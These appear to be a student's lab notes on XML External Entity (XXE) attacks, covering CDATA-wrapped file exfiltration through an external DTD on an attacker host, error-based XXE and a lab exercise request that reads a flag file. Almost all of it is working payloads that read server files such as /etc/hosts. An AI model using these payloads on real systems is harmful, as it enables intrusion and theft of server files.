# Advanced Exfiltration with CDATA
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
Calling back to `&joined;` will not work since XML prevents joining internal and external entities.
But you can use Parameters with `%`
`<!ENTITY joined "%begin;%file;%end;">`

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
![[Advanced-XML.png]]

# Error Based XXE
Using possible `blind` techniques
Changing things such as `<root>` to `<roo>`
Then it is possible to get files through the error
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Now referencing it with 
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
Finally,
![[XML-Error.png]]


# Exercise
```shell
POST /submitDetails.php HTTP/1.1
Host: 10.129.170.231
Content-Length: 351
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.170.231
Referer: http://10.129.170.231/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///flag.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://10.10.16.28:8000/xxe.dtd"> 
  %xxe;
]>
<root>
<name>First</name>
<tel>1234567890</tel>
<email>&joined;</email>
<message>First Message</message>
</root>
```

```bash
# Then make a file with
cat xxe.dtd  
<!ENTITY joined "%begin;%file;%end;">

# Then Python server
python3 -m http.server 8000
```

From there you can change the file to what is need such as the flag.